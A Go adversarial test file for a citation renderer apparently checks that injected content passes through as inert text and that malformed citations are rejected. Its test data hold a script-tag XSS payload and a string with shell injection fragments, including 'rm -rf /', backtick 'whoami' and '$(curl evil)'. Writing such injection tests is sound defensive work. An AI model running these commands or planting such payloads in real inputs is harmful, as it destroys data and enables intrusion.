// go:build adversarial
package adversarial

import (
	"strings"
	"testing"
	"time"

	"github.com/cbip-solutions/hades-system/internal/citation"
)

func TestAdversarial_CitationInjection_XSSPayload(t *testing.T) {
	env := &citation.Envelope{
		ID:           "c-xss01",
		Type:         citation.CitationTypeKGNode,
		Source:       citation.SourceCaronteQuery,
		Lane:         citation.LaneSemantic,
		AuditEventID: "evt-xss",
		Confidence:   0.5,
		ProjectID:    "p-xss",
		Payload:      `<script>alert("xss")</script>`,
	}

	r := citation.NewMarkdownFallback(nil)
	out, err := r.Render(env, citation.SessionContext{
		Doctrine: "default",
		Platform: "markdown",
		Now:      time.Date(2026, 5, 10, 12, 0, 0, 0, time.UTC),
	})
	if err != nil {
		t.Fatalf("Render: %v", err)
	}

	if !strings.Contains(out, "alert") {
		t.Error("XSS payload absent from output — over-aggressive filtering?")
	}
}

func TestAdversarial_CitationInjection_ShellMetacharsInTitle(t *testing.T) {
	env := &citation.Envelope{
		ID:           "c-shell01",
		Type:         citation.CitationTypeKGNode,
		Source:       citation.SourceCaronteQuery,
		Lane:         citation.LaneSemantic,
		AuditEventID: "evt-shell",
		ProjectID:    "p-shell",
		Payload:      "Engine.Run(); rm -rf /; `whoami`; $(curl evil)",
	}

	r := citation.NewMarkdownFallback(nil)
	out, err := r.Render(env, citation.SessionContext{
		Doctrine: "default",
		Platform: "markdown",
		Now:      time.Now(),
	})
	if err != nil {
		t.Fatalf("Render: %v", err)
	}

	for _, frag := range []string{"rm -rf /", "`whoami`", "$(curl evil)"} {
		if !strings.Contains(out, frag) {
			t.Errorf("expected %q in output (no shell interpolation), got:\n%s", frag, out)
		}
	}
}

func TestAdversarial_CitationInjection_NilEnvelopeRejected(t *testing.T) {
	r := citation.NewMarkdownFallback(nil)
	_, err := r.Render(nil, citation.SessionContext{Doctrine: "default", Platform: "markdown", Now: time.Now()})
	if err == nil {
		t.Error("nil envelope: no error, want validation error")
	}
}

func TestAdversarial_CitationInjection_InvalidIDRejected(t *testing.T) {
	env := &citation.Envelope{
		ID:           "INVALID-ID-WITH-UPPERCASE",
		Type:         citation.CitationTypeKGNode,
		Source:       citation.SourceCaronteQuery,
		Lane:         citation.LaneSemantic,
		AuditEventID: "evt",
		ProjectID:    "p",
		Payload:      "x",
	}

	r := citation.NewMarkdownFallback(nil)
	_, err := r.Render(env, citation.SessionContext{Doctrine: "default", Platform: "markdown", Now: time.Now()})
	if err == nil {
		t.Error("invalid ID: render succeeded, want validation error")
	}
}
